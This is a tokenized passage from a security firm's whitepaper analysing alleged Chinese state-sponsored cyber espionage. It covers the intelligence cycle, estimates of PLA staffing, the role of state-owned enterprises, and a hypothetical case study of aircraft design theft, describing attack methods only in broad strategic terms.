"financially", "."], ["Until", ",", "that", "is", ",", "the", "product", "made", "by", "the", "Chinese", "firm", "is", "offered", "for", "sale", "around", "the", "world", "at", "a", "much", "cheaper", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "12", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "price", "than", "that", "for", "which", "the", "original", "product", "is", "sold", ",", "because", "the", "Chinese", "firm", "has", "not", "needed", "to", "fund", "R&D."], ["At", "this", "point", ",", "buyers", "who", "simply", "want", "a", "widget", "that", "works", "will", "buy", "the", "cheaper", "one", "."], ["The", "National", "Outline", "document", "goes", "on", "to", "specify", "\u2018", "Frontier", "Technologies", "\u2019", ":", "areas", "such", "as", "biotech", ",", "IT", ",", "advanced", "materials", "and", "manufacturing", "technologies", ",", "energy", "and", "marine", "technology", ",", "lasers", "and", "(", "again", ")", "aerospace", ",", "all", "areas", "in", "which", "the", "West", "has", "traditionally", "excelled", "and", "China", "has", "lagged", "behind", "."], ["The", "other", "key", "area", "that", "could", "lead", "to", "a", "requirement", "for", "cyber", "attacks", "is", "China", "\u2019s", "intelligence", "-", "gathering", "operation", "."], ["This", "area", "is", "primarily", "controlled", "by", "the", "Party", "rather", "than", "the", "intelligence", "services", "themselves", "."], ["Requirements", "in", "this", "area", "are", "likely", "to", "incorporate", "generic", "tasks", "to", "infiltrate", "and", "disrupt", "the", "activities", "of", "the", "Five", "Poisons", "(", "see", "above", ")", ",", "to", "gather", "military", "secrets", "from", "overseas", "and", "highlight", "politically", "useful", "information", "."], ["That", "could", "be", ",", "for", "example", ",", "intelligence", "on", "economic", "policies", "of", "the", "Eurozone", "countries", "regarding", "China", ",", "NATO", "plans", "for", "Afghanistan", ",", "international", "efforts", "to", "negotiate", "with", "North", "Korea", "or", "reports", "into", "human", "rights", "abuses", "."], ["The", "intelligence", "services", "will", "use", "all", "of", "their", "sources", "\u2013", "HUMINT", ",", "SIGINT", "and", "cyber", "\u2013", "to", "address", "these", "requirements", "."], ["As", "the", "list", "is", "never", "published", "we", "can", "only", "guess", "at", "what", "it", "contains", ",", "but", "one", "may", "speculate", "that", "if", "intensive", "investigations", "focused", "on", "the", "detection", "of", "cyber", "attacks", "against", "the", "Five", "Poisons", "(", "the", "GhostNet14", "report", "was", "an", "excellent", "start", ")", ",", "it", "is", "likely", "that", "the", "same", "malware", "and", "infrastructure", "would", "be", "revealed", "to", "have", "been", "deployed", "."], ["http://www.scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-CyberEspionage-Network", "14", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "13", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["How", "Does", "it", "Happen", "?"], ["If", "we", "consider", "only", "the", "Chinese", "cyber", "attacks", "that", "have", "been", "reported", "we", "are", "only", "looking", "at", "the", "tip", "of", "the", "iceberg", "."], ["First", ",", "we", "tend", "only", "to", "see", "reports", "of", "British", "or", "American", "firms", "being", "attacked", ",", "and", "we", "know", "that", "only", "a", "tiny", "minority", "of", "incidents", "are", "reported", ",", "because", "firms", "are", "either", "unaware", "they", "have", "been", "attacked", "or", "are", "afraid", "that", "publicising", "an", "incident", "will", "damage", "their", "brand", ",", "their", "company", "value", "or", "their", "personal", "careers", "."], ["It", "is", "also", "likely", "that", "there", "is", "a", "huge", "number", "of", "small", "to", "medium", "sized", "enterprises", "around", "the", "world", "that", "have", "no", "idea", "that", "their", "crown", "jewels", "have", "been", "stolen", "."], ["Governments", "are", "unlikely", "to", "admit", "having", "lost", "data", "or", "to", "accuse", "China", "directly", ",", "for", "fear", "of", "risking", "negative", "political", "and", "economic", "consequences", "."], ["Individual", "victims", "living", "in", "China", "will", "be", "unable", "to", "complain", "at", "the", "intrusion", "to", "their", "privacy", ",", "while", "those", "outside", "China", "may", "have", "little", "recourse", "to", "any", "organisation", "which", "would", "take", "their", "claims", "seriously", "."], ["To", "map", "out", "the", "process", "and", "try", "to", "think", "about", "the", "scale", "of", "the", "attacks", "we", "must", "start", "with", "a", "classic", "diagram", "of", "the", "intelligence", "cycle", "."], ["Setting", "Requirements"], ["As", "we", "have", "already", "seen", ",", "China", "has", "no", "issue", "in", "identifying", "requirements", "."], ["These", "lie", "across", "the", "industrial", ",", "social", "and", "economic", "spectrum", "and", "represent", "the", "results", "of", "a", "mammoth", "effort", "to", "identify", "weaknesses", "and", "areas", "for", "further", "development", "."], ["Given", "that", "the", "requirements", "are", "largely", "focussed", "around", "technical", ",", "economic", "and", "commercial", "development", "rather", "than", "social", "development", "it", "is", "fair", "to", "expect", "that", "this", "exercise", "was", "not", "conducted", "by", "government", "alone", ",", "but", "must", "have", "been", "supplemented", "by", "private", "sector", "(", "so", "far", "as", "there", "is", "one", ")", "."], ["However", ",", "the", "setting", "of", "requirements", "covers", "many", "more", "areas", "than", "just", "cyber", ",", "so", "it", "would", "not", "be", "correct", "to", "regard", "this", "effort", "as", "having", "been", "conducted", "simply", "to", "support", "electronic", "attacks", "."], ["Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "14", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Planning", "and", "Direction"], ["This", "is", "where", "things", "get", "a", "little", "bit", "complicated", "."], ["Planning", "and", "direction", "activities", "take", "place", "on", "multiple", "levels", "\u2013", "at", "a", "Party", "level", ",", "regional", "level", ",", "local", "level", ",", "within", "every", "key", "government", "department", ",", "inside", "every", "company", "with", "a", "stake", "in", "fulfilling", "the", "requirements", ";", "and", "especially", "within", "the", "military", ",", "who", "evidence", "suggests", "are", "behind", "the", "bulk", "of", "targeted", "attacks", "."], ["Collection"], ["This", "area", "covers", "the", "whole", "process", "of", "target", "identification", ",", "malware", "development", ",", "crafting", "the", "attacks", ",", "designing", "the", "social", "engineering", ",", "initiating", "attacks", ",", "controlling", "implants", ",", "escalating", "privileges", "on", "the", "victim", "network", ",", "uploading", "further", "tools", "to", "maintain", "and", "develop", "access", ",", "finding", "and", "exfiltrating", "data", "of", "interest", ",", "and", "cleaning", "up", "traces", "of", "the", "attack", "to", "hinder", "investigations", "."], ["It", "also", "requires", "infrastructure", "(", "owned", "or", "stolen", ")", "to", "be", "constructed", "to", "support", "the", "attack", ",", "IP", "addresses", "or", "domain", "names", "updated", "into", "the", "implants", ",", "training", "of", "operators", ",", "language", "skills", ",", "management", "and", "some", "form", "of", "quality", "control", "process", "to", "enable", "some", "visibility", "over", "how", "well", "attacks", "are", "progressing", "."], ["While", "much", "of", "the", "attack", "process", "can", "be", "automated", "or", "simplified", "so", "it", "can", "be", "delegated", "to", "less", "technically", "adept", "operators", ",", "the", "scale", "of", "the", "attack", "is", "such", "that", "many", "skilled", "hackers", "will", "be", "needed", "in", "an", "advisory", "capacity", ",", "to", "conduct", "manual", "elements", "of", "the", "attack", ",", "to", "maintain", "a", "development", "program", "and", ",", "in", "some", "cases", ",", "to", "share", "details", "of", "the", "latest", "attack", "vectors", "and", "vulnerabilities", "with", "those", "tasked", "with", "cyber", "defence", "to", "protect", "Chinese", "systems", "from", "similar", "attacks", "."], ["There", "will", "also", "almost", "certainly", "be", "an", "administration", "process", "that", "logs", "attacks", "and", "targets", ",", "collates", "information", "on", "target", "systems", ",", "feeds", "data", "into", "some", "form", "of", "risk", "assessment", "and", "ensures", "that", "all", "ongoing", "attacks", "are", "focussed", "on", "the", "attainment", "of", "a", "specific", "requirement", "."], ["This", "is", "no", "small", "operation", "."], ["Processing", "and", "Exploitation"], ["If", "1,000", "attacks", "are", "successful", "and", "all", "result", "in", "large", "amounts", "of", "data", "being", "stolen", "from", "compromised", "systems", ",", "that", "data", "needs", "to", "be", "put", "into", "a", "readable", "format", "(", "and", "decrypted", "if", "necessary", ")", ",", "made", "searchable", ",", "stored", "in", "a", "database", "and", "translated", "into", "Chinese", "\u2013", "and", "all", "these", "operations", "have", "to", "be", "carried", "out", "in", "bulk", "and", "in", "real", "time", "or", "something", "close", "to", "it", ",", "to", "allow", "that", "information", "to", "be", "used", "as", "quickly", "and", "effectively", "as", "possible", "."], ["Of", "course", ",", "the", "actual", "number", "of", "active", "compromises", "at", "any", "one", "time", "is", "likely", "to", "be", "many", "magnitudes", "higher", "than", "1,000", "!"], ["Analysis", "and", "Production"], ["The", "first", "problem", "with", "analysing", "bulk", "amounts", "of", "data", "translated", "from", "other", "languages", "is", "that", "machine", "translation", "is", "often", "of", "low", "quality", ",", "particularly", "for", "data", "such", "as", "emails", "written", "using", "more", "colloquial", "terms", "."], ["The", "second", "issue", "is", "that", "a", "large", "proportion", "of", "the", "stolen", "documents", "is", "likely", "to", "be", "of", "a", "highly", "technical", "nature", ":", "If", "you", "steal", "documents", "from", "a", "widget", "maker", "then", "you", "need", "at", "least", "a", "basic", "knowledge", "of", "widgets", "to", "be", "able", "to", "understand", "the", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ","], ["E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "15", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "potential", "value", "of", "a", "document", "and", "how", "best", "to", "exploit", "it", "."], ["If", "there", "is", "a", "lot", "of", "widget", "data", "you", "will", "need", "a", "lot", "of", "widget", "specialists", "or", "risk", "the", "data", "being", "out", "of", "date", "by", "the", "time", "it", "is", "analysed", "."], ["And", "just", "because", "someone", "understands", "widgets", "does", "n\u2019t", "mean", "that", "they", "understand", "gizmos", ",", "so", "another", "team", "will", "be", "required", "to", "look", "at", "that", "data", "\u2013", "and", "so", "on", "."], ["These", "analysts", "will", "provide", "feedback", "to", "operators", ",", "perhaps", "saying", "\u2018", "get", "more", "\u2019", ",", "or", "\u2018", "this", "is", "no", "good", ",", "get", "something", "else", "\u2019", "."], ["They", "may", "also", "provide", "search", "terms", "for", "documents", "."], ["All", "this", "analysis", "will", "then", "need", "to", "be", "written", "up", "into", "reports", "which", "should", "try", "to", "protect", "the", "source", "of", "the", "information", "."], ["Dissemination"], ["If", "the", "information", "is", "to", "be", "useful", "the", "reporting", "process", "has", "to", "be", "fast", ",", "in", "order", "to", "get", "useful", "information", "to", "the", "right", "people", "."], ["Dissemination", "of", "intelligence", "reports", "to", "security", "and", "intelligence", "officers", "should", "be", "straightforward", "as", "all", "people", "in", "the", "process", "will", "have", "clearances", "."], ["But", "we", "can", "assume", "(", "although", "there", "are", "no", "guarantees", ")", "that", "this", "information", "is", "highly", "classified", "and", "dissemination", "is", "carefully", "controlled", ",", "which", "makes", "disseminating", "it", "to", "government", "officials", "a", "little", "more", "difficult", ",", "especially", "if", "those", "officials", "are", "based", "outside", "Beijing", ",", "because", "encrypted", "links", "or", "maybe", "a", "network", "of", "trusted", "couriers", "will", "be", "required", "to", "transport", "the", "reports", "."], ["The", "most", "difficult", "task", "will", "be", "delivering", "reports", "on", "commercial", "or", "technical", "development", "to", "the", "right", "people", "."], ["The", "most", "trusted", "individuals", "will", "be", "at", "the", "top", "of", "organisations", ",", "probably", "as", "a", "result", "of", "their", "loyalty", "to", "the", "Party", ",", "but", "these", "are", "not", "necessarily", "the", "people", "able", "to", "understand", ",", "interpret", "and", "exploit", "the", "information", "contained", "within", "the", "report", "."], ["So", "the", "report", "or", "elements", "of", "it", "must", "be", "passed", "downwards", "to", "those", "who", "do", "understand", "it", "."], ["This", "means", "a", "significant", "increase", "in", "the", "number", "of", "people", "who", "are", "aware", ",", "which", "represents", "a", "significant", "risk", "."], ["The", "Party", "must", "also", "decide", "to", "which", "companies", "it", "will", "pass", "information", "\u2013", "if", "five", "companies", "all", "produce", "widgets", "do", "you", "give", "the", "information", "on", "next", "generation", "widgets", "to", "one", "of", "them", ",", "or", "all", "of", "them", "?"], ["We", "will", "look", "at", "one", "way", "the", "Party", "addresses", "this", "issue", "below", "."], ["Getting", "the", "dissemination", "right", "should", "in", "turn", "generate", "more", "requirements", "and", "help", "to", "create", "a", "more", "refined", "requirement", "to", "feed", "back", "into", "the", "process", "and", "drive", "the", "next", "data", "acquisition", "cycle", "."], ["Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ","], ["E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "16", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "The", "Scale", "of", "the", "Operation"], ["Most", "authorities", "attribute", "responsibility", "for", "cyber", "attacks", "and", "intelligence", "gathering", "to", "the", "Third", "Department", "of", "the", "PLA", "(", "3PLA", ")", "and", "accept", "that", "the", "Second", "Department", "(", "2PLA", ")", "may", "also", "have", "a", "role", "to", "play", "."], ["Accurate", "figures", "for", "the", "size", "of", "these", "Departments", "are", "not", "publicly", "available", ",", "but", "the", "more", "success", "the", "attackers", "have", ",", "the", "more", "funding", "they", "are", "likely", "to", "get", "for", "further", "attacks", "."], ["Other", "branches", "of", "the", "military", "may", "then", "see", "the", "possibility", "for", "increased", "funding", "and", "political", "glory", "by", "competing", "in", "the", "same", "space", "."], ["One", "very", "thorough", "report", "by"], ["Project", "204915", ",", "a", "group", "who", "analyse", "the", "Asian", "security", "landscape", "among", "other", "topics", ",", "details", "the", "Third", "Department", "of", "the", "PLA", "and", "outlines", "their", "broader", "activities", "and", "structure", "."], ["Their", "role", "is", "primarily", "SIGINT", "aimed", "at", "intercepting", "radio", ",", "telecoms", "and", "email", "communications", "and", "reporting", "the", "content", "as", "intelligence", "."], ["The", "report", "contains", "a", "figure", "(", "though", "they", "make", "clear", "this", "is", "estimated", ")", "of", "130,000", "people", "being", "part", "of", "the", "3PLA", "."], ["The", "2PLA", "is", "concerned", "with", "Human", "Intelligence", "(", "HUMINT", ")", "as", "well", "as", "SIGINT", "to", "support", "its", "military", "intelligence", "mission", "."], ["So", "trying", "to", "work", "out", "how", "many", "people", "are", "involved", "in", "this", "process", "is", "only", "ever", "going", "to", "be", "based", "on", "educated", "guesswork", "."], ["If", "we", "look", "simply", "at", "the", "effort", "in", "the", "3PLA", ",", "put", "aside", "all", "other", "groups", "for", "now", "and", "take", "the", "figure", "of", "130,000", "as", "true", ",", "there", "is", "a", "very", "large", "pool", "of", "available", "personnel", "who", "are", "able", "to", "support", "cyber", "operations", "."], ["However", ",", "as", "we", "have", "stated", "above", ",", "the", "3PLA", "has", "a", "remit", "broader", "than", "simply", "cyber", "and", "other", "areas", "are", "far", "more", "established", "."], ["Numbers", "working", "in", "the", "requirements", "capture", "and", "planning", "area", "are", "probably", "in", "the", "low", "hundreds", "."], ["Trying", "to", "gauge", "the", "size", "of", "the", "collection", "effort", "is", "difficult", "and", "requires", "a", "large", "margin", "of", "error", "."], ["But", "it", "is", "fair", "to", "assume", "that", "several", "hundred", "people", "could", "do", "the", "target", "development", "work", ";", "around", "a", "hundred", "dedicated", "specialists", "could", "work", "on", "malware", "development", "(", "with", "the", "Chinese", "hacking", "community", "providing", "new", "tools", "at", "regular", "intervals", ")", ";", "perhaps", "one", "or", "two", "thousand", "low", "level", "operators", "(", "the", "\u2018", "B", "\u2019", "team", ")", "supported", "by", "another", "few", "hundred", "with", "more", "advanced", "skills", "(", "the", "\u2018", "A", "\u2019", "team", ")", "who", "look", "after", "the", "most", "sensitive", "intrusions", ";", "an", "infrastructure", "team", "of", "a", "few", "dozen", ";", "and", "an", "operational", "security", "team", "of", "a", "few", "dozen", "more", "."], ["Then", "come", "the", "processing", "and", "analysis", "experts", ":", "potentially", "a", "pool", "of", "several", "thousand", "specialists", "able", "to", "read", "and", "write", "in", "a", "wide", "variety", "of", "languages", ";", "hundreds", "if", "not", "thousands", "of", "specialists", "in", "all", "of", "the", "fields", "of", "information", "being", "stolen", "\u2013", "politics", ",", "economics", ",", "engineering", ",", "IT", ",", "science", ",", "etc", ";", "hundreds", "of", "report", "writers", ";", "dozens", "of", "people", "processing", "data", ";", "and", "dozens", "more", "administering", "the", "whole", "process", "."], ["If", "these", "very", "rough", "figures", "are", "anywhere", "close", "to", "reality", ",", "at", "least", "7,000", "people", "are", "directly", "involved", "in", "hacking", "foreign", "computer", "networks", "for", "the", "Chinese", "military", "and", "processing", "the", "output", "of", "those", "attacks", "."], ["Potentially", "many", "thousands", "more", "see", "the", "reporting", "and", "are", "aware", "of", "the", "sorts", "of", "results", "generated", "by", "these", "operations", "."], ["15http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf"], ["Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "17", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Profiting", "from", "the", "Product"], ["So", "who", "is", "most", "likely", "to", "profit", "from", "the", "information", "being", "gathered", "through", "these", "attacks", "?"], ["The", "political", ",", "economic", "and", "intelligence", "reporting", "has", "a", "clear", "audience", ",", "but", "deciding", "who", "the", "commercial", "intelligence", "should", "be", "passed", "to", "presents", "a", "more", "taxing", "problem", "."], ["Which", "companies", "receive", "this", "kind", "of", "assistance", "?"], ["The", "answer", "may", "lie", "in", "the", "particular", "brand", "of", "capitalism", "which", "China", "practices", "."], ["China", "is", "no", "longer", "the", "planned", "economy", "it", "once", "was", "and", "some", "Chinese", "companies", "are", "now", "among", "the", "largest", "in", "the", "world", "."], ["But", "this", "is", "not", "capitalism", "as", "we", "know", "it", "and", "these", "companies", "are", "far", "from", "being", "truly", "\u2018", "private", "\u2019", "."], ["All", "the", "largest", "companies", "in", "China", "are", "State", "Owned", "Enterprises", "(", "SOEs", ")", "in", "which", "the", "state", "is", "the", "largest", "(", "or", "only", ")", "shareholder", "."], ["The", "state", "can", "and", "does", "change", "company", "board", "members", "at", "will", "and", "members", "of", "the", "armed", "forces", "are", "routinely", "brought", "into", "senior", "management", "roles", "."], ["But", "in", "addition", "to", "simply", "appointing", "the", "heads", "of", "companies", ",", "the", "Party", "also", "has", "a", "final", "say", "over", "the", "strategic", "direction", "of", "each", "company", ",", "business", "planning", "processes", "and", "the", "size", "of", "salaries", "paid", "to", "employees", "."], ["After", "all", ",", "if", "companies", "are", "seen", "to", "be", "profiting", "unfairly", "at", "the", "expense", "of", "the", "workers", "that", "could", "lead", "to", "political", "unrest", "."], ["There", "are", "currently", "117", "companies", "classed", "as", "SOEs", "and", "under", "the", "control", "of", "the", "Stateowned", "Assets", "Supervision", "and", "Administration", "Commission", "(", "SASAC", ")", ",", "the", "primary", "shareholder", "in", "these", "companies", "."], ["To", "give", "some", "idea", "of", "the", "scale", "of", "SOEs", ",", "they", "now", "comprise", "80", "%", "of", "the", "value", "of", "China", "\u2019s", "stock", "market", "."], ["Yet", "in", "the", "last", "10", "years", ",", "the", "number", "of", "SOEs", "has", "almost", "halved", "as", "SASAC", "has", "pushed", "through", "mergers", "of", "companies", "with", "similar", "strengths", "to", "consolidate", "the", "overall", "power", "of", "these", "companies", "in", "various", "sectors", "and", "make", "them", "more", "competitive", "outside", "China", "."], ["SASAC", "works", "alongside", "the", "Communist", "Party", "\u2019s", "Organisation", "Department", ",", "which", "acts", "as", "a", "human", "resources", "department", "and", "makes", "certain", "that", "those", "running", "these", "businesses", "care", "every", "bit", "as", "much", "(", "if", "not", "more", ")", "about", "pleasing", "Party", "bosses", "as", "they", "do", "about", "their", "success", "in", "business", "."], ["In", "addition", "to", "the", "Party", "\u2019s", "input", "to", "the", "strategies", "pursued", "by", "these", "companies", ",", "the", "state", "is", "also", "instrumental", "in", "guiding", "them", "to", "financial", "success", "by", "other", "means", "."], ["Most", "significantly", "it", "arranges", "cheap", "lines", "of", "credit", ",", "allowing", "companies", "to", "borrow", "money", "for", "expansion", ";", "and", "provides", "a", "ready", "-", "made", "market", "for", "the", "company", "\u2013", "the", "Party", "has", "the", "ability", "to", "block", "competitors", "from", "any", "industry", "or", "to", "introduce", "policies", "which", "make", "competitors", "more", "expensive", "."], ["The", "state", "can", "also", "provide", "considerable", "human", "resources", "if", "a", "particular", "company", "or", "industry", "needs", "to", "increase", "production", "suddenly", ":", "large", "pools", "of", "labour", "in", "China", "work", "for", "the", "state", "rather", "than", "companies", "and", "so", "form", "a", "mobile", "and", "flexible", "workforce", "."], ["But", "if", "at", "the", "end", "of", "the", "day", "the", "products", "or", "services", "a", "company", "offers", "are", "outdated", "or", "of", "poor", "quality", ",", "that", "company", "will", "fail", "."], ["The", "Party", "has", "a", "vested", "interest", "in", "every", "SOE", "performing", "well", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")", "207", "537", "7515", "www.contextis.com", "18", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "and", "becoming", "a", "national", "or", "global", "champion", "in", "its", "sector", ",", "so", "it", "may", "be", "willing", "to", "extend", "help", "through", "the", "leveraging", "of", "intelligence", "sources", "."], ["Note", "the", "list", "of", "companies", "and", "sectors", "in", "Appendix", "A", ":", "it", "is", "clear", "that", "the", "companies", "on", "the", "list", "all", "have", "interests", "in", "areas", "which", "will", "support", "the", "Five", "Year", "Plan", "and", "Indigenous", "Innovation", "."], ["Hypothetical", "Case", "Study", ":"], ["Aircraft", "Construction"], ["One", "good", "example", "of", "how", "the", "Party", "could", "use", "its", "intelligence", "collection", "methods", "to", "benefit", "an", "SOE", "is", "seen", "in", "the", "case", "of", "COMAC16", ",", "the", "Commercial", "Aircraft", "Corporation", "of", "China", "."], ["COMAC", "is", "currently", "trying", "to", "build", "a", "large", "aircraft", "to", "compete", "with", "the", "likes", "of", "Boeing", "and", "Airbus", "."], ["In", "an", "excellent", "in", "-", "depth", "paper", "on", "Indigenous", "Innovation17", ",", "the", "US", "Chamber", "of", "Commerce", "and", "strategic", "consulting", "firm", "ACPO", "Worldwide18", "detail", "the", "desire", "of", "China", "to", "build", "an", "aircraft", "since", "the", "crash", "(", "and", "subsequent", "re", "-", "engineering", ")", "of", "a", "Pakistan", "Airlines", "Boeing", "707", "in", "1971", "."], ["The", "re", "-", "engineered", "plane", "named", "the", "Yun-10", "was", "a", "complete", "failure", "as"], ["China", "did", "not", "at", "that", "time", "possess", "all", "the", "necessary", "technology", "required", "to", "make", "it"], ["a", "success", "."], ["With", "a", "rise", "in", "the", "use", "of", "air", "transport", "within", "China", ",", "domestic", "carriers", "are", "being", "forced", "to", "buy", "foreign", "aircraft", "at", "enormous", "cost", ",", "whereas", "a", "home", "-", "grown", "aircraft", "could", "be", "sold", "much", "more", "cheaply", "."], ["The", "COMAC", "C91919", "is", "designed", "to", "rival", "the", "Boeing", "737", "and", "Airbus", "A320", "and", "planned", "to", "be", "operating", "by", "2015", ",", "and", "to", "encourage", "foreign", "companies", "to", "share", "their", "technology", ",", "China", "has", "promised", "access", "to", "the", "market", "."], ["Companies", "including", "Parker", "Aerospace", ",", "General", "Electric", ",", "Honeywell", "and", "Goodrich", "have", "all", "signed", "up", "."], ["Whether", "they", "benefit", "from", "this", "move", "in", "the", "long", "term", ",", "or", "are", "instead", "encouraged", "to", "leave", "once", "they", "have", "been", "bled", "dry", "of", "useful", "information", ",", "remains", "to", "be", "seen", "."], ["But", "for", "all", "the", "help", "they", "are", "getting", ",", "Chinese", "engineers", "are", "not", "yet", "able", "to", "access", "the", "technology", "developed", "by", "Boeing", "and", "Airbus", ",", "or", "by", "large", "aeroplane", "engine", "suppliers", "such", "as", "Rolls", "Royce", "."], ["We", "know", "therefore", "that", "there", "is", "intent", "to", "build", "a", "domestic", "airliner", "and", "that", "previously", "reengineering", "has", "been", "attempted", "."], ["Technology", "transfer", "is", "ongoing", "at", "the", "moment", ",", "but", "how", "(", "hypothetically", ")", "could", "computer", "network", "exploitation", "attacks", "help", "China", "achieve", "its", "goal", "?"], ["It", "is", "hard", "to", "imagine", "that", "a", "project", "of", "that", "size", "would", "not", "be", "given", "some", "assistance", "by", "the", "government", ",", "given", "that", "there", "is", "national", "pride", "at", "stake", "."], ["If", "intelligence", "or", "military", "resources", "could", "be", "directed", "against", "Boeing", "and", "Airbus", "networks", "there", "would", "be", "some", "very", "quick", "wins", "."], ["Not", "only", "could", "design", "documents", "and", "technical", "information", "be", "stolen", "en", "masse", "and", "without", "the", "need", "to", "actually", "deal", "with", "the", "company", ",", "but", "there", "could", "be", "some", "weak", "links", "in", "the", "supply", "chains", "of", "these", "companies", "which", "would", "help", "an", "attacker", "to", "penetrate", "their", "networks", "."], ["First", ",", "smaller", "suppliers", "would", "provide", "an", "easy", "target", "from", "where", "attacks", "could", "be", "launched", "directly", ",", "spoofing", "emails", "with", "Trojans", "to", "improve", "the", "chance", "of", "recipients", "opening", "them", "."], ["Second", ",", "both", "companies", "have", "facilities", "in", "China", ",", "presumably", "with", "network", "connectivity", "which", "may", "provide", "a", "direct", "route", "into", "the", "main", "network", "."], ["There", "are", "also", "Chinese", "citizens", "working", "for", "the", "two", "target", "organisations", "who", "could", "be", "tasked", "to", "download", "something", "nefarious", "or", "plug", "in", "a", "USB", "drive", "to", "help", "their", "country", "."], ["http://english.comac.cc/"], ["http://www.uschamber.com/sites/default/files/reports/100728chinareport_0.pdf", "18", "http://www.apcoworldwide.com/", "19", "http://en.wikipedia.org/wiki/Comac_C919", "16", "17", "Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "19", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Finally", "all", "large", "organisations", "share", "large", "amounts", "of", "their", "data", "with", "third", "parties", "such", "as", "law", "firms", "and", "consultants", ";", "companies", "that", "may", "not", "protect", "their", "networks", "as", "effectively", "as", "the", "target", "company", "."], ["These", "\u2018", "data", "aggregators", "\u2019", "can", "present", "a", "major", "vulnerability", "in", "the", "security", "of", "sensitive", "data", "."], ["The", "end", "goal", "of", "the", "project", "is", "to", "sell", "the", "aircraft", "worldwide", "and", "to", "undercut", "the", "established", "suppliers", "."], ["COMAC", "could", "achieve", "this", "by", "using", "lines", "of", "credit", "at", "favourable", "rates", "from", "the", "Chinese", "banks", "that", "would", "help", "to", "make", "deals", "cheaper", "for", "airlines", "purchasing", "aircraft", "."], ["But", "what", "really", "helps", "these", "companies", "undercut", "foreign", "rivals", "is", "that", "they", "have", "not", "needed", "to", "spend", "huge", "amounts", "of", "money", "on", "R&D", "to", "get", "the", "plane", "off", "the", "ground", "in", "the", "first", "place", "."], ["If", "designs", "for", "the", "body", "of", "the", "aircraft", "could", "be", "stolen", "along", "with", "aerodynamic", "information", "it", "would", "cut", "development", "time", "by", "years", ";", "and", "by", "billions", "of", "dollars", "."], ["If", "stolen", "engine", "designs", "were", "also", "used", "that", "would", "cut", "costs", "further", "still", "."], ["Even", "if", "the", "companies", "from", "whom", "this", "technology", "had", "been", "stolen", "were", "able", "to", "see", "that", "it", "had", "been", "stolen", ",", "they", "would", "only", "be", "able", "to", "take", "limited", "action", "in", "response", ";", "and", "to", "do", "so", "could", "put", "at", "risk", "their", "continued", "ability", "to", "operate", "or", "sell", "in", "China", "."], ["The", "list", "of", "SOEs", "in", "\u201c", "Appendix", "A", "\u201d", "is", "dominated", "by", "transport", "companies", "(", "rail", ",", "aerospace", "and", "shipping", ")", ",", "energy", "(", "petrochemical", ",", "nuclear", ",", "power", "generation", "/", "distribution", ",", "hydro", ")", ",", "telecoms"], ["(", "mobile", ",", "infrastructure", ")", ",", "manufacturing", ",", "extraction", "/", "metals", "(", "coal", ",", "iron", ",", "steel", ",", "minerals", ",", "aluminium", ")", "and", "trading", "companies", "."], ["If", "a", "company", "has", "been", "targeted", "by", "Chinese", "state", "sponsored", "cyber", "espionage", ",", "we", "believe", "that", "any", "information", "stolen", "probably", "ends", "up", "in", "one", "of", "these", "SOEs", "."], ["While", "China", "is", "able", "to", "manipulate", "market", "conditions", "in", "various", "ways", "to", "help", "SOEs", "prosper", ",", "nothing", "would", "contribute", "more", "to", "their", "growth", "and", "success", "than", "a", "supply", "of", "inside", "information", "about", "the", "activities", "of", "their", "competitors", "and", "customers", "."], ["Context", "Information", "Security", "30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP", "+44", "(", "0", ")"], ["207", "537", "7515", "www.contextis.com", "20", "/", "33", "Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data", "Conclusion"], ["This", "situation", "has", "not", "developed", "overnight", "."], ["These", "attacks", "have", "been", "going", "on", "for", "years", ":", "many", "reports", "detail", "intrusions", "going", "back", "to", "2003", "and", "earlier", "."], ["It", "is", "quite", "possible", "that", "the", "targets", "of", "early", "attacks", "were", "merely", "foreign", "governments", "and", "dissidents", "and", "that", "the", "range", "of", "targets", "only", "broadened", "with", "the", "opening", "of", "the", "Chinese", "economy", "and", "an", "increased", "demand", "for", "intelligence", "to", "support", "business", "growth", "and", "projects", "of", "national", "importance", "."], ["The", "more", "success", "the", "attackers", "had", ",", "the", "more", "that", "demand", "grew", "."], ["While", "China", "continues", "to", "carry", "out", "cyber", "attacks", "on", "companies", "throughout", "the", "rest", "of", "the", "world", "and", "these", "attacks", "continue", "either", "unnoticed", "or", "unpunished", ",", "there", "is", "no", "incentive", "for", "China", "to", "stop", "."], ["The", "more", "that", "stolen", "data", "is", "exploited", "for", "the", 